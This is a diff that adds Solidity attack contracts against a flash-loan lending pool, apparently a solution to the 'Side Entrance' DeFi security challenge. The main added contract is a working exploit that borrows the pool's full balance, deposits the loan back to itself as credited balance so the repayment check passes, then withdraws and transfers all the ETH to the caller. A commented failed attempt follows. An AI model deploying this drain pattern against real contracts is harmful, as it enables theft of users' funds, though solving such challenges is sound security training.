@@ -35,4 +35,55 @@ contract SideEntranceLenderPool {
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
 }
+
+contract SideEntranceAttack {
+    SideEntranceLenderPool pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    // require an external payable function to receive ETH
+    receive() external payable {}    
+
+    // calls flash loan at the pool balance
+    // flashLoan function calls the execute contract of this function
+    // execute() deposits ETH back to pool as this contract's balance
+    // actually rebalances the SideEntranceLenderPool of the flash loan
+    // withdraw() ETH back and transfers that amount to sender
+    function attack() public {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() public payable {
+        pool.deposit{value: msg.value}();
+    }
+}
+
+// very similar attempt!
+contract SideEntranceAttackAttempt {
+    SideEntranceLenderPool pool;
+    address attacker;
+
+    constructor(address _pool, address _attacker) {
+        pool = SideEntranceLenderPool(_pool);
+        attacker = _attacker;
+    }
+
+    function attack() public {
+        pool.flashLoan(address(pool).balance);
+    }
+
+    // similar implementation but this does not pass the require() at the end of flashLoan
+    // flashLoan() fails before calling
+    function execute() public payable {
+        pool.deposit{value: msg.value}();
+        pool.withdraw();
+        payable(attacker).transfer(address(this).balance);
+    }
+}
+
+
  
